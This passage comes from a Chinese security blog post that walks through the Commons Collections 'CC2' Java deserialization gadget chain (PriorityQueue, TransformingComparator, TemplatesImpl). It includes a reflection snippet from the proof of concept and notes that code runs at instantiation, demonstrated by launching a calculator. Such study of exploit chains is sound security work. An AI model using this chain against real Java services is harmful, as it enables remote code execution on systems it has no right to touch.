= queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.........</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看这几个方法，首先comparator.compare会被siftDownUsingComparator方法调用。<br>siftDownUsingComparator–&gt;siftDown–&gt;heapify()</p>
+<h2 id="step5"><a href="#step5" class="headerlink" title="step5"></a>step5</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field field3=queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);<span class="comment">//获取queue的queue字段</span></span><br><span class="line">field3.setAccessible(<span class="keyword">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">field3.set(queue,<span class="keyword">new</span> Object[]&#123;templatesImpl,templatesImpl&#125;);<span class="comment">//设置queue的queue字段内容Object数组，内容为templatesImpl</span></span><br></pre></td></tr></table></figure>
+<p>最后就是readobject复写点了，PriorityQueue的readobject代码实现如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后调用heapify()实现了反序列化rce。</p>
+<h2 id="正向跟一波"><a href="#正向跟一波" class="headerlink" title="正向跟一波"></a>正向跟一波</h2><p>调试跟一遍</p>
+<p>1.反序列化我们构造的对象进入PriorityQueue的readobject方法最后调用heapify方法<br><img src="/2021/03/19/cc2%E9%93%BE/3.png" alt="3"><br>heapify会调用siftDown方法，并且传入queue，这里的queue是刚刚传入的构造好恶意代码的TemplatesImpl实例化对象。</p>
+<p><img src="/2021/03/19/cc2%E9%93%BE/4.png" alt="4"></p>
+<p>进而调用siftdown方法<br><img src="/2021/03/19/cc2%E9%93%BE/5.png" alt="5"></p>
+<p>这里的comparator就是poc里设置的字段值也就是TransformingComparator修饰过的InvokerTransformer实例化对象</p>
+<p>继续进入siftDownUsingComparator</p>
+<p><img src="/2021/03/19/cc2%E9%93%BE/6.png" alt="6"></p>
+<p>小结：PriorityQueue类<br>readObject–&gt;heapify()–&gt;siftDown()–&gt;siftDownUsingComparator()–&gt;comparator.compare()<br>在PriorityQueue中构造方法comparator是可控的。</p>
+<p>这里调用TransformingComparator的compare方法，跟进</p>
+<p><img src="/2021/03/19/cc2%E9%93%BE/7.png" alt="7"></p>
+<p>在这里传入的2个参数，内容为TemplatesImpl实例化对象<br><img src="/2021/03/19/cc2%E9%93%BE/8.png" alt="8"></p>
+<p>最后调用newtransform方法，然后继续调用TransformerImpl<br>小结：TransformingComparator中compare函数会调用transform方法，解决调用transform方法的问题。templatesImpl解决runtime实例化的问题</p>
+<p><img src="/2021/03/19/cc2%E9%93%BE/9.png" alt="9"><br>首先是会判断_name的值是否为空，之前通过反射设置过该值为test，进入下一个语句是判断_class是否为空，进入defineTransletClasses方法</p>
+<p><img src="/2021/03/19/cc2%E9%93%BE/10.png" alt="10"></p>
+<p>进入之后经过判断将_bytecodes赋值给_class<br><img src="/2021/03/19/cc2%E9%93%BE/11.png" alt="11"></p>
+<p>赋值完成后继续回到getTransletInstance方法将生成的payload类实例化<br><img src="/2021/03/19/cc2%E9%93%BE/12.png" alt="12"></p>
+<p>直接弹出计算器是因为javassist生成的类执行的payload在静态代码块里，当我们new一个对象就会执行功能。</p>
+<p>Runtime执行命令代码是在静态代码块里面，静态代码块会在new对象的时候去执行。</p>
+<p>其实很多细节方面都没有说到，计划接下来java会跟着yso工具学习</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/" rel="prev" title="审计某cms到insert注入技巧">
+                  <i class="fa fa-chevron-left"></i> 审计某cms到insert注入技巧
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">热爱篮球和安全的小伙子</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
